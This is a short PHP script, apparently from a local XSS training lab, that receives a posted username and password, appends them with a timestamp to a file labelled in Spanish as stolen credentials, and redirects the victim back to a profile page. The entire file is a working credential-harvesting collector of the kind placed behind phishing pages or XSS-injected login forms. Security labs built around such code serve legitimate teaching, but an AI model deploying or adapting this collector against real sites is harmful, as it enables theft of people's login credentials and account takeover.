<?php
$username = $_POST['username'];
$password = $_POST['password'];

$log_entry = "Credenciales robadas - " . date('Y-m-d H:i:s') . "\n";
$log_entry .= "Usuario: " . $username . "\n";
$log_entry .= "Contraseña: " . $password . "\n";
$log_entry .= "---------------------------------\n";

file_put_contents('robado.txt', $log_entry, FILE_APPEND);

header('Location: http://localhost/lab_xss/profile.php');
exit();
?>

